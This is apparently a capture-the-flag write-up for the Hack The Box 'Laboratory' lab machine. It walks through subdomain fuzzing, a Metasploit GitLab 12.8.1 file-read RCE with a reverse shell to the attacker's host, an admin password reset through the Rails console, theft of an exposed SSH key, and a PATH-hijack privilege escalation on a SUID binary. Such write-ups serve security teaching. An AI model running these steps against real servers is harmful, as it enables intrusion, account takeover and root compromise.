# Laboratory

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.78.175
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-29 17:18 +08
Nmap scan report for 10.129.78.175
Host is up (0.043s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
```

We have to add `laboratory.htb` to our `/etc/hosts` file to access the web ports.&#x20;

### Laboratory -> Gitlab RCE

The website is some kind of company page for coding services:

<figure><img src="../../../.gitbook/assets/image (570).png" alt=""><figcaption></figcaption></figure>

The background animated thing is pretty cool honestly. Anyways, this looked pretty static, so I did a subdomain and directory scan on the site, and found one `git` subdomain.

```
$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hc=200 -H 'Host: FUZZ.laboratory.htb' -u https://laboratory.htb
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: https://laboratory.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                     
=====================================================================

000000262:   302        0 L      5 W        105 Ch      "git"
```

When we visit this subdomain, it reveals a GitLab instance.&#x20;

<figure><img src="../../../.gitbook/assets/image (415).png" alt=""><figcaption></figcaption></figure>

When trying to create a user, it appears we have to have a specific email domain being used.

<figure><img src="../../../.gitbook/assets/image (3649).png" alt=""><figcaption></figcaption></figure>

Using `laboratory.htb` works as the email domain, then we can view the dashbaord:

<figure><img src="../../../.gitbook/assets/image (1775).png" alt=""><figcaption></figcaption></figure>

Interestingly, this was running GitLab 12.8.1, which is an outdated version of the software.

<figure><img src="../../../.gitbook/assets/image (2901).png" alt=""><figcaption></figcaption></figure>

This version is vulnerable to an LFI.

{% embed url="https://github.com/anjai94/gitlab-file-read-exploit/blob/main/exploitv3.py" %}

It was also vulnerable to RCE exploits.

{% embed url="https://www.rapid7.com/db/modules/exploit/multi/http/gitlab_file_read_rce/" %}

There was a Metasploit module for it, which I honestly wanted to try and it works!

```
msf6 exploit(multi/http/gitlab_file_read_rce) > exploit

[*] Started reverse TCP handler on 10.10.14.42:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. GitLab 12.8.1 is a vulnerable version.
[*] Logged in to user test123
[*] Created project /test123/7fc8Znm1
[*] Created project /test123/QoNdBDpL
[*] Created issue /test123/7fc8Znm1/issues/1
[*] Executing arbitrary file load
[+] File saved as: '/home/kali/.msf4/loot/20230629173041_default_10.129.78.175_gitlab.secrets_009016.txt'
[+] Extracted secret_key_base 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3
[*] NOTE: Setting the SECRET_KEY_BASE option with the above value will skip this arbitrary file read
[*] Attempting to delete project /test123/7fc8Znm1
[*] Deleted project /test123/7fc8Znm1
[*] Attempting to delete project /test123/QoNdBDpL
[*] Deleted project /test123/QoNdBDpL
[*] Command shell session 1 opened (10.10.14.42:4444 -> 10.129.78.175:37260) at 2023-06-29 17:30:50 +0800

id
uid=998(git) gid=998(git) groups=998(git)
```

I only wanted to use this because I was lazy to set up the Docker containers required for the exploit.

{% embed url="https://github.com/leecybersec/gitlab-rce" %}

## Privilege Escalation

### GitLab Rails -> SSH Key

This shell was spawned within a container, and there weren't any users in the `home` directory.

```
git@git:/home$ ls -la
total 8
drwxr-xr-x 2 root root 4096 Apr 12  2016 .
drwxr-xr-x 1 root root 4096 Jul  2  2020 ..
```

Within the home directory of the `git` user, there were loads of Gitlab related files:

```
git@git:~$ ls -la
total 96
drwxr-xr-x 20 root              root       4096 Jun 29 09:16 .
drwxr-xr-x  1 root              root       4096 Feb 24  2020 ..
drwxr-xr-x  2 git               git        4096 Jul  2  2020 .bundle
-rw-r--r--  1 git               git         367 Jul  2  2020 .gitconfig
drwx------  2 git               git        4096 Jul  2  2020 .ssh
drwxr-x---  3 gitlab-prometheus root       4096 Jun 29 09:16 alertmanager
drwx------  2 git               root       4096 Jul  2  2020 backups
-rw-------  1 root              root         38 Jul  2  2020 bootstrapped
drwx------  3 git               root       4096 Jul  2  2020 git-data
drwx------  3 git               root       4096 Jun 29 09:16 gitaly
drwxr-xr-x  3 git               root       4096 Jul  2  2020 gitlab-ci
drwxr-xr-x  2 git               root       4096 Jun 29 09:16 gitlab-exporter
drwxr-xr-x  9 git               root       4096 Jun 29 09:16 gitlab-rails
drwx------  2 git               root       4096 Jun 29 09:16 gitlab-shell
drwxr-x---  2 git               gitlab-www 4096 Jun 29 09:16 gitlab-workhorse
drwx------  4 gitlab-prometheus root       4096 Oct 20  2020 grafana
drwx------  3 root              root       4096 Jun 29 09:26 logrotate
drwxr-x---  9 root              gitlab-www 4096 Jun 29 09:16 nginx
drwx------  2 gitlab-psql       root       4096 Jun 29 09:16 postgres-exporter
drwxr-xr-x  3 gitlab-psql       root       4096 Jun 29 09:16 postgresql
drwxr-x---  4 gitlab-prometheus root       4096 Jun 29 09:16 prometheus
-rw-r--r--  1 root              root        226 Jun 29 09:16 public_attributes.json
drwxr-x---  2 gitlab-redis      git        4096 Jun 29 09:31 redis
-rw-r--r--  1 root              root         40 Jul  2  2020 trusted-certs-directory-hash
```

The main thing I was looking for was credentials to any other users on the Gitlab instance, since they may have interesting files to look at. I googled more about password for Gitlab, and found methods to reset the user's password.

{% embed url="https://docs.gitlab.com/ee/security/reset_user_password.html" %}

The documentation states that need to start a rails console, which we can do using `gitlab-rails console`.&#x20;

```
git@git:/$ gitlab-rails console
--------------------------------------------------------------------------------
 GitLab:       12.8.1 (d18b43a5f5a) FOSS
 GitLab Shell: 11.0.0
 PostgreSQL:   10.12
--------------------------------------------------------------------------------
```

We can start some basic enumeration by first finding the administrators:

```
irb(main):002:0> User.admins
User.admins
=> #<ActiveRecord::Relation [#<User id:1 @dexter>]>
```

Then, we can actually reset the password of `dexter`.&#x20;

```
irb(main):005:0> user = User.find_by_username 'dexter'
user = User.find_by_username 'dexter'
=> #<User id:1 @dexter>
irb(main):006:0> new_password = 'Password@123'
new_password = 'Password@123'
=> "Password@123"
irb(main):007:0> user.password = new_password
user.password = new_password
=> "Password@123"
irb(main):008:0> user.password_confirmation = new_password
user.password_confirmation = new_password
=> "Password@123"
irb(main):010:0> user.save!
user.save
Enqueued ActionMailer::DeliveryJob (Job ID: b987cd5d-e2e4-4558-a5ed-31339c1046f4) to Sidekiq(mailers) with arguments: "DeviseMailer", "password_change", "deliver_now", #<GlobalID:0x00007f16f64012a8 @uri=#<URI::GID gid://gitlab/User/1>>
```

Afterwards, we can sign in as `dexter` and view his projects:

<figure><img src="../../../.gitbook/assets/image (3724).png" alt=""><figcaption></figcaption></figure>

'Some personal stuff' in the SecureDocker project. Turns out that refers to his private SSH key that was left on the project!

<figure><img src="../../../.gitbook/assets/image (1289).png" alt=""><figcaption></figcaption></figure>

Using this, we can `ssh` in as the user and grab the user flag:

<figure><img src="../../../.gitbook/assets/image (2690).png" alt=""><figcaption></figcaption></figure>

### Ghidra -> SUID Exploit

I ran a `linpeas.sh` scan on the machine and found some interesting SUID binaries:

```
════════════════════════════════════╣ Interesting Files ╠════════════════════════════════════
[+] SUID - Check easy privesc, exploits and write perms
<TRUNCATED>
-rwsr-xr-x 1 root   dexter           17K Aug 28  2020 /usr/local/bin/docker-security
-rwsr-xr-x 1 root   root            163K Jan 19  2021 /usr/bin/sudo
```

The `docker-security` one looks like the intended exploit path. When run, this binary does nothing:

```
dexter@laboratory:/$ /usr/local/bin/docker-security
dexter@laboratory:/$ 
```

I downloaded a copy of this binary to my Kali machine because it looks custom and I could not find any other software online matching this. Then, I opened up a copy in Ghidra. The program is really simple:

<figure><img src="../../../.gitbook/assets/image (907).png" alt=""><figcaption></figcaption></figure>

The funny thing is that the binary is using the full path for the target file, but `chmod` itself doesn't have the full path specified. All we have to do is create an program that is called `chmod` which executes a command as `root`:

```
dexter@laboratory:/tmp$ echo '/bin/bash' > chmod
dexter@laboratory:/tmp$ chmod 777 /tmp/chmod
dexter@laboratory:/tmp$ export PATH=/tmp:$PATH
```

Then, we can just run `docker-security` to get a `root` shell:

<figure><img src="../../../.gitbook/assets/image (3902).png" alt=""><figcaption></figcaption></figure>

Rooted!
